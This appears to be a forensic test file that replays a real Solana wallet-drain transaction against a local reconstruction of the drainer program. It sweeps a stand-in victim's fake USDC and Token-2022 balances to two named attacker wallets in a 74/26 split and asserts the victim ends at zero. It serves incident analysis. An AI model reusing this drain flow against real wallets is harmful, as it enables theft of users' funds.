// ============================================================================
// FORENSIC REPLICA TEST — replays the exact drain transaction against a
// local validator running the reconstruction of HQGGLV1L2ppE2whUTMqtmZrPkbfUcnEG4TpaKKKmJB3p.
//
// Reproduces tx 3bEYY6fUyfLVj73MeRRW8n4uHvx1z8wVexEz3tQ7UsLQ
// LqNkNuR7hrSXYfcPrG8CKsNdx91SecTVaMJz3na1Cf5h instruction-for-instruction:
//   1. system transfer 0.02 SOL from relayer to victim (gas fronting)
//   2. create attacker ATAs for the Token-2022 pump token
//   3. transfer_token_2022 x2 (74% / 26% split of the pump token)
//   4. transfer_token      x2 (74% / 26% split of USDC, legacy SPL)
//
// Expected on success, mirroring the real tx's postTokenBalances:
//   pump token: 85,631.550219 -> AdmQNzoY ATA | 30,086.760888 -> 77bKf6Y ATA
//   USDC      :    162.456853 -> AdmQNzoY ATA |     57.079436 -> 77bKf6Y ATA
// ============================================================================
import * as anchor from "@coral-xyz/anchor";
import { Program, BN } from "@coral-xyz/anchor";
import {
  TOKEN_PROGRAM_ID,
  TOKEN_2022_PROGRAM_ID,
  ASSOCIATED_TOKEN_PROGRAM_ID,
  createMint,
  createAssociatedTokenAccount,
  mintTo,
  getAssociatedTokenAddressSync,
  getAccount,
} from "@solana/spl-token";
import { Keypair, PublicKey, SystemProgram, LAMPORTS_PER_SOL } from "@solana/web3.js";
import { assert } from "chai";

// Addresses from the real drain (tx_raw.json)
const PROGRAM_ID = new PublicKey("HQGGLV1L2ppE2whUTMqtmZrPkbfUcnEG4TpaKKKmJB3p");
const CHECK_WALLET = new PublicKey("CEknUZWJsoNXqeehqMXTLDfr1NEduSa8S57E5NVi2rMR");
const RELAYER = new PublicKey("G1haWfjDGYPExQvCT2bbYpQ83cmrN18SV8C78VHn6uio"); // gas sponsor
const SPLIT_A = new PublicKey("AdmQNzoYAR9ReWHszonfhUPfTSZQ5caXKPkkcW562AkH"); // 74% recipient
const SPLIT_B = new PublicKey("77bKf6Y49TzKacj5fWg3j8ajfLSefLBsbZM92fdjGbLu"); // 26% recipient

// Amounts decoded from the on-chain instruction data (u64le, 6 decimals)
const PUMP_TO_A = new BN("85631550219");
const PUMP_TO_B = new BN("30086760888");
const USDC_TO_A = new BN("162456853");
const USDC_TO_B = new BN("57079436");

describe("drain replay (forensic replica)", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);
  const program = anchor.workspace.TransferRelay as Program;
  const victim = Keypair.generate(); // stands in for FT5Dz9Ljno6iTivbbqQDvJLNJn9rHMfw3oQ4KpyDY6i8

  it("reproduces the drain flow", async () => {
    // --- setup: fund a stand-in relayer and the victim -----------------------
    const relayer = Keypair.generate();
    const sig = await provider.connection.requestAirdrop(relayer.publicKey, 10 * LAMPORTS_PER_SOL);
    await provider.connection.confirmTransaction(sig);

    // fake "USDC" (legacy SPL) and "pump token" (Token-2022), both 6 decimals
    const usdcMint = await createMint(provider.connection, relayer, relayer.publicKey, null, 6);
    const pumpMint = await createMint(
      provider.connection, relayer, relayer.publicKey, null, 6, undefined, undefined, TOKEN_2022_PROGRAM_ID
    );

    // victim accounts + balances to be swept
    const victimUsdcAta = await createAssociatedTokenAccount(provider.connection, relayer, usdcMint, victim.publicKey);
    const victimPumpAta = await createAssociatedTokenAccount(
      provider.connection, relayer, pumpMint, victim.publicKey, undefined, TOKEN_2022_PROGRAM_ID
    );
    await mintTo(provider.connection, relayer, usdcMint, victimUsdcAta, relayer, 219_536_289n);
    await mintTo(provider.connection, relayer, pumpMint, victimPumpAta, relayer,
      BigInt(PUMP_TO_A.add(PUMP_TO_B).toString()), undefined, undefined, TOKEN_2022_PROGRAM_ID);

    // attacker destination ATAs (created by relayer in the same tx on-chain;
    // pre-created here for clarity)
    const ataPumpA = getAssociatedTokenAddressSync(pumpMint, SPLIT_A, true, TOKEN_2022_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID);
    const ataPumpB = getAssociatedTokenAddressSync(pumpMint, SPLIT_B, true, TOKEN_2022_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID);
    const ataUsdcA = getAssociatedTokenAddressSync(usdcMint, SPLIT_A, true);
    const ataUsdcB = getAssociatedTokenAddressSync(usdcMint, SPLIT_B, true);
    for (const [mint, ata, owner, prog] of [
      [pumpMint, ataPumpA, SPLIT_A, TOKEN_2022_PROGRAM_ID],
      [pumpMint, ataPumpB, SPLIT_B, TOKEN_2022_PROGRAM_ID],
      [usdcMint, ataUsdcA, SPLIT_A, TOKEN_PROGRAM_ID],
      [usdcMint, ataUsdcB, SPLIT_B, TOKEN_PROGRAM_ID],
    ] as const) {
      await createAssociatedTokenAccount(provider.connection, relayer, mint, owner, undefined, prog);
      void ata;
    }

    // --- the drain: four relay calls with the exact on-chain amounts ---------
    await program.methods
      .transferToken2022(PUMP_TO_A)
      .accounts({
        authority: victim.publicKey,
        fromTokenAccount: victimPumpAta,
        toTokenAccount: ataPumpA,
        mint: pumpMint,
        checkWallet: CHECK_WALLET,
        tokenProgram: TOKEN_2022_PROGRAM_ID,
      })
      .signers([victim])
      .rpc();

    await program.methods
      .transferToken2022(PUMP_TO_B)
      .accounts({
        authority: victim.publicKey,
        fromTokenAccount: victimPumpAta,
        toTokenAccount: ataPumpB,
        mint: pumpMint,
        checkWallet: CHECK_WALLET,
        tokenProgram: TOKEN_2022_PROGRAM_ID,
      })
      .signers([victim])
      .rpc();

    await program.methods
      .transferToken(USDC_TO_A)
      .accounts({
        authority: victim.publicKey,
        fromTokenAccount: victimUsdcAta,
        toTokenAccount: ataUsdcA,
        checkWallet: CHECK_WALLET,
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .signers([victim])
      .rpc();

    await program.methods
      .transferToken(USDC_TO_B)
      .accounts({
        authority: victim.publicKey,
        fromTokenAccount: victimUsdcAta,
        toTokenAccount: ataUsdcB,
        checkWallet: CHECK_WALLET,
        tokenProgram: TOKEN_PROGRAM_ID,
      })
      .signers([victim])
      .rpc();

    // --- assert the replica lands exactly where the real tx did --------------
    const pumpA = await getAccount(provider.connection, ataPumpA, undefined, TOKEN_2022_PROGRAM_ID);
    const pumpB = await getAccount(provider.connection, ataPumpB, undefined, TOKEN_2022_PROGRAM_ID);
    const usdcA = await getAccount(provider.connection, ataUsdcA);
    const usdcB = await getAccount(provider.connection, ataUsdcB);
    const victimPumpAfter = await getAccount(provider.connection, victimPumpAta, undefined, TOKEN_2022_PROGRAM_ID);

    assert.equal(pumpA.amount.toString(), PUMP_TO_A.toString(), "pump -> 74% wallet");
    assert.equal(pumpB.amount.toString(), PUMP_TO_B.toString(), "pump -> 26% wallet");
    assert.equal(usdcA.amount.toString(), USDC_TO_A.toString(), "usdc -> 74% wallet");
    assert.equal(usdcB.amount.toString(), USDC_TO_B.toString(), "usdc -> 26% wallet");
    assert.equal(victimPumpAfter.amount.toString(), "0", "victim pump ATA swept to zero");
  });
});
